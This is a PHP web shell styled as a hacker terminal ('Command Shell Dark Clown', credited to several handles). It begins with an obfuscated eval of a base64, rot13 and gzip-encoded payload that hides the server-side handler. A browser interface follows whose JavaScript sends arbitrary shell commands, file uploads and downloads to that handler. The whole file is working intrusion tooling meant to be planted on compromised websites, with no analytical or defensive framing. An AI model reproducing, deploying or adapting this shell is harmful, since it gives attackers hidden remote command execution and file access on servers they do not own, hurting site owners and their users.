<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?><!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>Mr.TenAr@shell:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                background: url(https://scontent.flux1-1.fna.fbcdn.net/v/t1.0-9/109185442_723119798235133_3698277027341313183_o.jpg?_nc_cat=104&_nc_sid=e3f864&_nc_eui2=AeF4_qGTyn-eCr9v5kWpltmL9WbzDadScZb1ZvMNp1Jxll555z-n8LZch-cAqAzEzbcJc0ktPfXBWCmHjcFSHhzH&_nc_ohc=L7H5gqXJ_fAAX-v6h8y&_nc_ht=scontent.flux1-1.fna&oh=5c2401b3257e5ba0d2d5d84f10fd636a&oe=5F667467);
                background-size: 100%;
                background-position: cover;
                color: #FF4180;
                font-family: monospace;
            }

            #shell {
                background: #222;
                max-width: 800px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }

            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            @media (max-width: 991px) {
                #shell-logo {
                    display: none;
                }

                html, body, #shell {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }

                #shell {
                    margin-top: 0;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }
            #four-oh-four img.bg {
            -webkit-filter: grayscale(55%);
            filter: grayscale(55%);
            position: absolute;
            background-image: url(https://laughinggeek.files.wordpress.com/2017/06/lightbulb.gif);
            background-color: #333333;
            background-position: center center;
            background-size: 150% 150%;
            width: 100%;
            height: 100%;
            top: 0;
            -webkit-transform: rotate(180deg);
            transform: rotate(180deg);
            z-index: -999;
            }
            #four-oh-four #error-container .overlay {
            position: absolute;
            background-color: #000;
            width: 100%;
            height: 100%;
            top: 0;
            opacity: 0.3;
}
#four-oh-four .terminal {
  position: relative;
  background: rgba(38, 38, 38, 0.8);
  width: 80%;
  height: 40vh;
  border-radius: 8px;
  box-shadow: 0 1px 10px rgba(0, 0, 0, 0.55);
  margin: 20vh auto;
}
#four-oh-four .terminal .window-title {
  background: linear-gradient(top, #dedede, #c0c0c0);
  width: calc(100% - 16px);
  height: 8%;
  border-top-left-radius: 8px;
  border-top-right-radius: 8px;
  padding: 1px 8px;
}
#four-oh-four .terminal .window-title .win-buttons {
  position: relative;
  width: 15%;
  left: -11px;
  float: left;
  margin: 0;
}
#four-oh-four .terminal .window-title .button {
  display: inline-block;
  text-align: center;
  width: 10px;
  height: 10px;
  border: 0.5px solid;
  border-radius: 100px;
  vertical-align: middle;
  margin: 3px 2px 3px 0;
}
#four-oh-four .terminal .window-title #close {
  background: #e25544;
  border-color: #d84b3a;
}
#four-oh-four .terminal .window-title #min {
  background: #f5b640;
  border-color: #e0a12b;
}
#four-oh-four .terminal .window-title #max {
  background: #7cb058;
  border-color: #6fa44b;
}
#four-oh-four .terminal .title {
  position: relative;
  display: inline-block;
  color: #ffffff;
  font-weight: 400;
  letter-spacing: 0.06em;
  text-align: center;
  vertical-align: middle;
  top: 0.5px;
  left: -43px;
}
#four-oh-four .terminal .prompt {
  font-size: 98%;
}
#four-oh-four .terminal .user {
  color: #ea7e7d;
  letter-spacing: 0.002em;
  padding-right: 3px;
}
#four-oh-four .terminal .at {
  color: #e8d880;
  padding-right: 2px;
}
#four-oh-four .terminal .path {
  color: #7ecdcb;
  letter-spacing: 0.002em;
  padding-right: 2px;
}
#four-oh-four .terminal .caret {
  color: #50cd70;
}
        </style>

        <script>
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;

            function _insertCommand(command) {
                eShellContent.innerHTML += "\n\n";
                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function featureShell(command) {

                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                    eShellContent.innerHTML = '';
                } else {
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(response.name, response.file)
                        } else {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        }
                    });
                }
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;  // no completion

                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );

            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return "Mr.TenAr@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = response.cwd;
                    _updatePrompt();
                });

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }

            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
            };
        </script>
    </head>
    <body>
    <section id="four-oh-four">
    <div class="terminal">
      <div class="window-title">
        <div class="win-buttons">
          <a id="close" class="button" href="#"></a>
          <a id="min" class="button" href="#"></a>
          <a id="max" class="button" href="#"></a>
        </div>
        <center>
                <span class="title">Command Shell Dark Clown</span></div>
        </center>
        <div id="shell terminal window-title win-buttons">
            <pre id="shell-content">
                <div id="shell-logo">
  _____             _       _____ _                        _____                      _ _         <span></span>
 |  __ \           | |     / ____| |                      / ____|                    (_) |        <span></span>
 | |  | | __ _ _ __| | __ | |    | | _____      ___ __   | (___   ___  ___ _   _ _ __ _| |_ _   _ <span></span>
 | |  | |/ _` | '__| |/ / | |    | |/ _ \ \ /\ / / '_ \   \___ \ / _ \/ __| | | | '__| | __| | | |<span></span>
 | |__| | (_| | |  |   <  | |____| | (_) \ V  V /| | | |  ____) |  __/ (__| |_| | |  | | |_| |_| |<span></span>
 |_____/ \__,_|_|  |_|\_\  \_____|_|\___/ \_/\_/ |_| |_| |_____/ \___|\___|\__,_|_|  |_|\__|\__, |<span></span>
                                                                                             __/ |<span></span>
                                                                                            |___/ <span></span>
       Thans To : Mr.Painlover ~ Mr.V1RX ~ Mr.Sendpie404 ~ Ze2f <span></span>
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>
